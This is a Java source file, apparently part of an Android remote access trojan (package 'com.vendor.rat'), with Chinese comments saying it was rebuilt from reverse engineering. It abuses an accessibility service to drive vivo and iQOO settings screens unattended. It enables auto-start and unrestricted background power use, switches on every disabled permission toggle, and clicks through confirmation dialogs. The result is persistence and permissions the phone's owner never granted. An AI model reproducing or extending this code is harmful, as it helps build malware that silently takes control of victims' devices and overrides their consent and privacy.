package com.vendor.rat.auto.engine.vendor;

import android.content.ComponentName;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.engine.AutoEngine;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.auto.filter.NodeFilter;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * vivo 厂商适配引擎 (模块 03)
 *
 * 基于逆向分析: o/u.java (~400 行)
 *
 * 适配:
 *   - 自启动管理 (com.vivo.abe / com.iqoo.secure)
 *   - 后台高耗电 (ExcessivePowerManagerActivity)
 *   - 权限管理 (com.vivo.permissionmanager)
 *
 * 监听的界面:
 *   - BackgroundApplicationManagerActivity (后台应用管理)
 *   - ExcessivePowerManagerActivity (后台高耗电)
 *   - PurviewTabActivity (权限管理)
 *   - SoftPermissionDetailActivity (权限详情)
 *   - InstalledAppDetailsTop (应用详情)
 *
 * 市场份额: ~12%
 */
public class VivoEngine extends AutoEngine {

    private static final String TAG = "VivoEngine";

    // vivo 包名
    private static final String ABE = "com.vivo.abe";
    private static final String IQOO_SECURE = "com.iqoo.secure";
    private static final String PERMISSION_MANAGER = "com.vivo.permissionmanager";
    private static final String VIVO_SETTINGS = "com.vivo.settings";

    // vivo Activity
    private static final String BACKGROUND_MANAGER_ACTIVITY =
        "com.vivo.applicationbehaviorengine.ui.BackgroundApplicationManagerActivity";
    private static final String EXCESSIVE_POWER_ACTIVITY =
        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity";
    private static final String EXCESSIVE_POWER_DESC_ACTIVITY =
        "com.vivo.applicationbehaviorengine.ui.ExcessivePowerDescriptionActivity";
    private static final String PURVIEW_TAB_ACTIVITY =
        "com.vivo.permissionmanager.activity.PurviewTabActivity";
    private static final String SOFT_PERMISSION_DETAIL =
        "com.vivo.permissionmanager.activity.SoftPermissionDetailActivity";
    private static final String INSTALLED_APP_DETAILS =
        "com.vivo.settings.applications.InstalledAppDetailsTop";
    private static final String VIVO_SUB_SETTINGS =
        "com.vivo.settings.VivoSubSettings";

    // 状态标志
    private final AtomicBoolean autoStartDone = new AtomicBoolean(false);
    private final AtomicBoolean backgroundPowerDone = new AtomicBoolean(false);

    // 应用名称
    private String appName;

    public VivoEngine() {
        super(buildWindowMatchers(), PERMISSION_MANAGER);

        // 定时检查
        scheduler.schedule(new Runnable() {
            @Override
            public void run() {
                checkPermissionStatus();
            }
        }, 100L, TimeUnit.SECONDS);
    }

    /**
     * 构建窗口匹配列表
     */
    private static List<WindowMatcher> buildWindowMatchers() {
        List<WindowMatcher> list = new ArrayList<>();

        // 1. 后台应用管理
        WindowMatcher bgManager = new WindowMatcher(ABE, BACKGROUND_MANAGER_ACTIVITY);
        bgManager.addEventType(32);
        bgManager.addEventType(16384);
        list.add(bgManager);

        // 2. 后台高耗电
        list.add(new WindowMatcher(ABE, EXCESSIVE_POWER_ACTIVITY));
        list.add(new WindowMatcher(ABE, EXCESSIVE_POWER_DESC_ACTIVITY));

        // 3. iQOO 版本
        list.add(new WindowMatcher(IQOO_SECURE, BACKGROUND_MANAGER_ACTIVITY));
        list.add(new WindowMatcher(IQOO_SECURE, EXCESSIVE_POWER_ACTIVITY));

        // 4. 权限管理
        list.add(new WindowMatcher(PERMISSION_MANAGER, PURVIEW_TAB_ACTIVITY));
        list.add(new WindowMatcher(PERMISSION_MANAGER, SOFT_PERMISSION_DETAIL));

        // 5. 应用详情
        list.add(new WindowMatcher(VIVO_SETTINGS, INSTALLED_APP_DETAILS));
        list.add(new WindowMatcher(VIVO_SETTINGS, VIVO_SUB_SETTINGS));

        return list;
    }

    @Override
    public void onWindowMatched(String packageName, String className,
                                AccessibilityEvent event) {
        log("Window matched: " + packageName + "/" + className);

        try {
            if (BACKGROUND_MANAGER_ACTIVITY.equals(className)) {
                handleBackgroundManagerPage();
            } else if (EXCESSIVE_POWER_ACTIVITY.equals(className)
                    || EXCESSIVE_POWER_DESC_ACTIVITY.equals(className)) {
                handleExcessivePowerPage();
            } else if (PURVIEW_TAB_ACTIVITY.equals(className)
                    || SOFT_PERMISSION_DETAIL.equals(className)) {
                handlePermissionPage();
            } else if (INSTALLED_APP_DETAILS.equals(className)
                    || VIVO_SUB_SETTINGS.equals(className)) {
                handleAppDetailsPage();
            }
        } catch (Exception e) {
            logError("Error handling window", e);
        }
    }

    @Override
    public void execute() {
        openBackgroundManager();
    }

    // ============ 后台应用管理 ============

    /**
     * 打开 vivo 后台应用管理
     * 基于逆向: Intent(com.vivo.abe, BackgroundApplicationManagerActivity)
     */
    private void openBackgroundManager() {
        try {
            MyAccessibilityService service = MyAccessibilityService.getInstance();
            if (service == null) return;

            Intent intent = new Intent();
            intent.setComponent(new ComponentName(ABE, BACKGROUND_MANAGER_ACTIVITY));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            service.startActivity(intent);
            log("Opened background manager");
        } catch (Exception e) {
            logError("Failed to open via com.vivo.abe", e);
            // 尝试 iQOO 路径
            try {
                MyAccessibilityService service = MyAccessibilityService.getInstance();
                if (service == null) return;
                Intent intent = new Intent();
                intent.setComponent(new ComponentName(IQOO_SECURE, BACKGROUND_MANAGER_ACTIVITY));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                service.startActivity(intent);
            } catch (Exception e2) {
                logError("iQOO path also failed", e2);
            }
        }
    }

    /**
     * 处理后台应用管理页面
     * 基于逆向: 查找应用 → 点击 → 开启开关
     */
    private void handleBackgroundManagerPage() {
        if (autoStartDone.get()) return;

        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找应用
        UiNode appNode = findAppNode(root);
        if (appNode == null) {
            UiNode scrollable = getScrollableNode();
            if (scrollable != null) {
                appNode = scrollable.scrollForwardUntil(buildAppNameFilter());
            }
        }

        if (appNode != null) {
            log("Found app in background manager");
            appNode.click();
            sleep(1000);

            // 在新页面查找开关
            root = getRootNode();
            if (root != null) {
                UiNode switchBtn = root.findOneByClassName("android.widget.Switch");
                if (switchBtn != null && !switchBtn.isChecked()) {
                    switchBtn.click();
                    log("Enabled auto-start switch");
                    autoStartDone.set(true);
                    sleep(300);

                    // 处理确认对话框 ("继续" 按钮)
                    handleContinueDialog();
                } else if (switchBtn != null) {
                    autoStartDone.set(true);
                }
            }
        }
    }

    // ============ 后台高耗电 ============

    /**
     * 处理后台高耗电页面
     * 基于逆向: 查找"允许后台高耗电" → 点击
     */
    private void handleExcessivePowerPage() {
        if (backgroundPowerDone.get()) return;

        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找 "允许后台高耗电"
        UiNode allowHighPower = root.findOneByCombine(
            CombineFilter.or(
                CombineFilter.textView("允许后台高耗电"),
                CombineFilter.textView("允许后台运行"),
                CombineFilter.textView("不限制")
            )
        );

        if (allowHighPower != null) {
            allowHighPower.click();
            log("Selected '允许后台高耗电'");
            backgroundPowerDone.set(true);
            sleep(500);
            performBack();
        }
    }

    // ============ 权限管理 ============

    /**
     * 处理权限管理页面
     */
    private void handlePermissionPage() {
        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找所有未开启的开关
        List<UiNode> switches = root.findAllByClassName("android.widget.Switch");
        for (UiNode switchNode : switches) {
            if (!switchNode.isChecked()) {
                switchNode.click();
                log("Enabled permission switch");
                sleep(300);
            }
        }
    }

    // ============ 应用详情页 ============

    /**
     * 处理应用详情页
     * 基于逆向: 查找"后台耗电管理" → 点击
     */
    private void handleAppDetailsPage() {
        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        UiNode powerManage = root.findOneByCombine(
            CombineFilter.or(
                CombineFilter.textView("后台耗电管理"),
                CombineFilter.textView("电池优化"),
                CombineFilter.textView("耗电保护")
            )
        );

        if (powerManage != null) {
            powerManage.click();
            log("Clicked power management in app details");
        }
    }

    // ============ 对话框 ============

    /**
     * 处理 "继续" 确认对话框
     * 基于逆向: vivo 开启自启动后可能弹出确认框
     */
    private void handleContinueDialog() {
        sleep(500);
        UiNode root = getRootNode();
        if (root == null) return;

        // 查找 "继续" 按钮
        UiNode continueBtn = root.findOneByTextContains("继续");
        if (continueBtn == null) {
            continueBtn = root.findOneByCombine(CombineFilter.button("允许"));
        }
        if (continueBtn == null) {
            continueBtn = root.findOneByCombine(CombineFilter.button("确定"));
        }

        if (continueBtn != null) {
            continueBtn.click();
            log("Clicked continue/confirm button");
        }
    }

    // ============ 工具方法 ============

    private UiNode findAppNode(UiNode root) {
        if (appName != null && !appName.isEmpty()) {
            return root.findOneByTextContains(appName);
        }
        return root.findOneByTextContains("com.vendor.rat");
    }

    private NodeFilter buildAppNameFilter() {
        if (appName != null && !appName.isEmpty()) {
            return StringCondition.textContains(appName);
        }
        return StringCondition.textContains("com.vendor.rat");
    }

    private void checkPermissionStatus() {
        if (autoStartDone.get() && backgroundPowerDone.get()) {
            log("All vivo permissions granted");
            finish();
        }
    }

    public void setAppName(String appName) {
        this.appName = appName;
    }
}
